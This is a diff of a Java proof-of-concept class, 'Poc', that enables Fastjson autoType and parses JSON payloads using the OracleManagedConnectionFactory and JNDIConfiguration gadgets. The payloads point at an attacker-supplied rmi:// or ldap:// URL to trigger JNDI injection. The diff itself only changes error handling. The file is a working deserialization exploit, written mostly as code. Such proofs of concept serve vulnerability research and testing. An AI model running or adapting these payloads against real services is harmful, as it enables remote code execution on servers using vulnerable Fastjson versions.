@@ -14,30 +14,27 @@ import java.io.IOException;
 
 public class Poc {
 
-    public static void run(String sourceURL) {
-        try {
-            ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+    public static void run(String sourceURL) throws Exception
+    {
+        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
 
-            JSONObject obj  = null;
-            String jsonStr1 ="{\"@type\":\"oracle.jdbc.connector.OracleManagedConnectionFactory\",\"xaDataSourceName\":\"" + sourceURL + "\"}";
-            String jsonStr2 = "{\"@type\":\"org.apache.commons.configuration.JNDIConfiguration\",\"prefix\":\"" + sourceURL + "\"}";
+        JSONObject obj  = null;
+        String jsonStr1 ="{\"@type\":\"oracle.jdbc.connector.OracleManagedConnectionFactory\",\"xaDataSourceName\":\"" + sourceURL + "\"}";
+        String jsonStr2 = "{\"@type\":\"org.apache.commons.configuration.JNDIConfiguration\",\"prefix\":\"" + sourceURL + "\"}";
 
-            if (sourceURL.startsWith("rmi://")) 
-            {
-                obj = JSON.parseObject(jsonStr1);
-            }
-            else if (sourceURL.startsWith("ldap://"))
-            {
-                obj = JSON.parseObject(jsonStr2);
-            }
-            else
-            {
-                
-            }
-
-            obj.toJSONString();
-        } catch (Exception e) {
-            e.printStackTrace();
+        if (sourceURL.startsWith("rmi://")) 
+        {
+            obj = JSON.parseObject(jsonStr1);
         }
+        else if (sourceURL.startsWith("ldap://"))
+        {
+            obj = JSON.parseObject(jsonStr2);
+        }
+        else
+        {
+            throw new IllegalArgumentException("sourceURL must be one of rmi:// or ldap://");
+        }
+
+        obj.toJSONString();
     }
 }
